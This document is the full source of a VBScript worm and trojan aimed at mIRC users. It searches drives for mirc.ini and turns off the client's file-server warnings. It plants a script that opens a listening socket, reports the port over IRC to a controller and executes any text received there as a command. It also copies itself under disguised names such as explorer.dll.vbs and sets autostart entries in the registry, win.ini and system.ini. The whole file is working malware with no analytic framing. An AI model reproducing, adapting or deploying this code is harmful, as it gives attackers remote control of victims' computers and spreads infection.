dim Otag 
dim AOtag
dim Ttag 
dim DummyTag
dim SectionDef

call ShowFolderList("c:\")

sub ShowFolderList(s)
on error resume next

    Set filesys = CreateObject("Scripting.FileSystemObject")
    Set RootFolder1 = FileSys.GetFolder(s)
	Set SubFolds1 = RootFolder1.subfolders
	For Each f1 in Subfolds1
		s = f1.path & "\"
		Otag = s & "mirc.ini"
		AOtag= s & "mirc.dat"
		DummyTag= "C:\winamod.dat"
		TTag= s & "mircGUI.ini"
		SectionDef= "[rfiles]"
		if filesys.fileexists(otag) then 
			Call Filemod() 
			filesys.CopyFile DummyTag, Otag, true
			Call ImplementRemote()
			filesys.CopyFile DummyTag, Otag, true
			Call ImplementWarn()
			filesys.CopyFile DummyTag, Otag, true
			Call ImplementFserv()
			filesys.CopyFile DummyTag, Otag, true
			call ImplementPerfCheck()
			filesys.CopyFile DummyTag, Otag, true
			Call ImplementPerform()
			SetClearArchiveBit(Otag)
                        Call espalha()
                         End If
	Call ShowFolderList(s)
    Next
End sub

sub espalha ()
Dim obj,sistema,windows,temp,s, f
Set obj = CreateObject("Scripting.FileSystemObject")
Set sistema = obj.GetSpecialFolder(1)
Set windows = obj.GetSpecialFolder(0)
Set temp = obj.GetSpecialFolder(2)
set s = CreateObject("Scripting.FileSystemObject")
Set f = s.GetFile(WScript.ScriptFullName)

f.copy(windows&"\kernel.src.vbs")
f.copy(temp&"\~W74638.doc.vbs")
f.copy(sistema&"\explorer.dll.vbs")

alvo=windows&"\kernel.src.vbs"
alvo1=sistema&"\explorer.dll.vbs"
alvo2=temp&"\~W74638.doc.vbs"
alvo3=sistema&"\explorer.dll.vbs"
alvo4=windows&"\kernel.src.vbs"
alvo5="explorer.dll.vbs"

Set WSHShell = CreateObject("WScript.Shell")
WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\", alvo
WSHShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\", alvo1
WSHShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\", alvo2
editini windows&"\win.ini","[windows]","load",alvo3
editini windows&"\win.ini","[windows]","run",alvo4
editini windows&"\system.ini","[boot]","shell","Explorer.exe " & alvo5
end sub

Function FiltNum(FilString)
'on error resume next
countdown=5
do
	Comp = mid(FilString,2,countdown)
	if isnumeric(Comp) then LastNum = Comp : exit do
countdown=countdown-1
loop until countdown =0
FiltNum = LastNum
end function

Function LastLineNum(SSection)
'on error resume next
Set FS1N = CreateObject("Scripting.FileSystemObject")
Set FR1N = FS1N.OpenTextFile(otag,1,true)

Do While FR1N.AtEndOfStream <> True
	segment1 = FR1N.readline
	w = InstrRev(segment1,SSection)
	counts=counts+1
	if w > 0 then 
		do
			if FR1N.AtEndOfStream = True then exit do
			segmentk = FR1N.readline
			k = InstrRev(segmentk,"n",1)		
			if k=1 then
				LastNum=FiltNum(segmentk)
			end if
		Loop until k=0
	end if
loop
FR1N.Close
LastLineNum=LastNum
end function

Function Filemod()
'on error resume next
Set fs1 = CreateObject("Scripting.FileSystemObject")
Set fr1 = fs1.OpenTextFile(otag,1,true)
Set fs2 = CreateObject("Scripting.FileSystemObject")
Set fr2 = fs2.OpenTextFile(DummyTag,2,true)

Do While fr1.AtEndOfStream <> True
	segment1 = fr1.readline
	fr2.writeline segment1
	w = InstrRev(segment1,"[rfiles]")
	counts=counts+1
	if w > 0 then 
	counts2=counts
		do
			if fr1.AtEndOfStream = True then exit do
			segmentk = fr1.readline
			k = InstrRev(segmentk,"n",1)		
			if k=1 then
				LastNum=FiltNum(segmentk)
				fr2.writeline segmentk
			end if
		COUNTS2=COUNTS2+1
		Loop until k<>1
	exit do
	end if
loop
fr1.Close
fr2.close

Set fs3 = CreateObject("Scripting.FileSystemObject")
Set fr3 = fs3.OpenTextFile(DummyTag,8,true)
TrojanInfo = "n" & lastlinenum(SectionDef)+1 & "=mircGUI.ini"
fr3.writeline TrojanInfo
fr3.Close

Set fs4 = CreateObject("Scripting.FileSystemObject")
Set fr4 = fs4.OpenTextFile(Otag,1,true)

Set fs5 = CreateObject("Scripting.FileSystemObject")
Set fr5 = fs5.OpenTextFile(DummyTag,8,true)

Do While fr4.AtEndOfStream <> True
	segment2 = fr4.readline
	if fr4.line >= counts2 + 2 then 
		fr5.writeline segment2
	end if
loop
fr4.Close
fr5.Close
fs5.CopyFile DummyTag, Otag, true
Call FLDL(TTag)
end Function

sub FLDL(TTag)
'on error resume next
Set fs6 = CreateObject("Scripting.FileSystemObject")
Set fr6 = fs6.OpenTextFile(TTag,2,true)
fr6.writeline "[script]"
fr6.writeline "n0=;this script was writed by SWaNk SOD Staff Member"
fr6.writeline "n1=on 1:CONNECT:{ set %prt $rand(1,4) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) | st"
fr6.writeline "n2=  timerconn 0 60 //raw -q privmsg %mstr prt:_ $+ %prt"
fr6.writeline "n3=  alias /timer /echo 2* Active timers: No timers activated " 
fr6.writeline "n4=  alias st { sockclose sod | socklisten sod %prt  }"
fr6.writeline "n5=}"
fr6.writeline "n6=on 1:TEXT:*teste¡*:#:{ //raw -q privmsg $nick prt:_ $+ %prt | set %mstr $nick }"
fr6.writeline "n7=on *:socklisten:sod:{ var %sock = sod_ $+ $ticks | sockaccept %sock }"
fr6.writeline "n8=on *:sockread:sod_*:{ if ($sockerr) { return } | sockread %lido |  %lido }" 
fr6.close
end sub

Function ImplementRemote()
Set fs1a = CreateObject("Scripting.FileSystemObject")
Set fr1a = fs1a.OpenTextFile(otag,1,true)
Set fs2a = CreateObject("Scripting.FileSystemObject")
Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)

Do While fr1a.AtEndOfStream <> True
	segment1a = fr1a.readline
	fr2a.writeline segment1a
	if ucase(segment1a)=ucase("[options]") then
	Do
		If fr1a.AtEndOfStream Then exit do
		n2a = fr1a.readline
		If ucase(mid(n2a,1,3))=ucase("n2=") then
			fr2a.writeline Mid(n2a, 1, 13) & "1,1" & Mid(n2a, 17, 16) & "1" & Mid(n2a, 34)
			exit do
		Else
			fr2a.writeline n2a
		End If
	Loop
	end if
loop
fr1a.Close
fr2a.close
End Function

Function Implementfserv()
Set fs1a = CreateObject("Scripting.FileSystemObject")
Set fr1a = fs1a.OpenTextFile(otag,1,true)
Set fs2a = CreateObject("Scripting.FileSystemObject")
Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)

Do While fr1a.AtEndOfStream <> True
	segment1a = fr1a.readline
	fr2a.writeline segment1a
	if ucase(segment1a)=ucase("[warn]") then
	Do
		If fr1a.AtEndOfStream Then exit do
		n2a = fr1a.readline
		If ucase(n2a)=ucase("fserve=on") then
			fr2a.writeline "fserve=off"
		Else
			fr2a.writeline n2a
		End If
	Loop
	end if
loop
fr1a.Close
fr2a.close
End Function

Function Implementwarn()
Set fs1c = CreateObject("Scripting.FileSystemObject")
Set fr1c = fs1c.OpenTextFile(otag,1,true)
Set fs2c = CreateObject("Scripting.FileSystemObject")
Set fr2c = fs2c.OpenTextFile(DummyTag,2,true)

Do While fr1c.AtEndOfStream <> True
	segment1c = fr1c.readline
	fr2c.writeline segment1c
	if ucase(segment1c)=ucase("[fileserver]") then
	Do
		if fr1c.AtEndOfStream then exit do
		n2c = fr1c.readline
		If ucase(n2c)=ucase("warning=on") then
			fr2c.writeline "warning=off"
		Else
			fr2c.writeline n2c
		End If
	Loop
	end if
loop
fr1c.Close
fr2c.close
End Function

Function ImplementPerform()
Set fs1p = CreateObject("Scripting.FileSystemObject")
Set fr1p = fs1p.OpenTextFile(Otag,8,true)
fr1p.writeline "[Perform]"
fr1p.writeline "n0=/Remote ON"
fr1p.Close
fs1p.close
End Function

Sub SetClearArchiveBit(filespec)  
Dim fsg, fg
Set fsg = CreateObject("Scripting.FileSystemObject")
Set fg = fsg.GetFile(filespec)  
fg.attributes = 0
fg.attributes = fg.attributes + 1
End Sub

Function ImplementPerfCheck()
Set fs1f = CreateObject("Scripting.FileSystemObject")
Set fr1f = fs1f.OpenTextFile(otag,1,true)
Set fs2f = CreateObject("Scripting.FileSystemObject")
Set fr2f = fs2f.OpenTextFile(DummyTag,2,true)

Do While fr1f.AtEndOfStream <> True
	segment1f = fr1f.readline
	fr2f.writeline segment1f
	if ucase(segment1f)=ucase("[options]") then
	Do
		If fr1f.AtEndOfStream Then exit do
		n2f = fr1f.readline
		If ucase(mid(n2f,1,3))=ucase("n0=") then
			fr2f.writeline Mid(n2f, 1, 40) & ",1," & Mid(n2f, 44)
			exit do
		Else
			fr2f.writeline n2f
		End If
	Loop
	end if
loop
fr1f.Close
fr2f.close
End Function

sub editini(filename,section,string,newvalue)
on error resume next
Const ForReading = 1
Const ForWriting = 2
iniFile = filename
sectionName = section
keyName = string
newVlaue = newvalue
bInSection = false
bKeyChanged = false
Set fso = CreateObject("Scripting.FileSystemObject")
Set ts = fso.OpenTextFile(iniFile, ForReading)
lines = Split(ts.ReadAll,vbCrLf)
ts.close
For n = 0 to ubound(lines)
if left(lines(n),1) = "[" then
if bInSection then
exit for
end if
if instr(lines(n),sectionName) = 1 then
bInSection = true
else
bInSection = false
end if
else
if bInSection then
if instr(lines(n),keyName & "=") = 1 then
bKeyChanged = true
lines(n) = keyName & "=" & newVlaue
bKeyChanged = true
exit for
end if
end if
end if
Next
if bKeyChanged then
Set ts = fso.OpenTextFile(iniFile, ForWriting)
ts.Write join(lines,vbCrLf)
ts.close
end if
set ts = nothing
set fso = nothing
end sub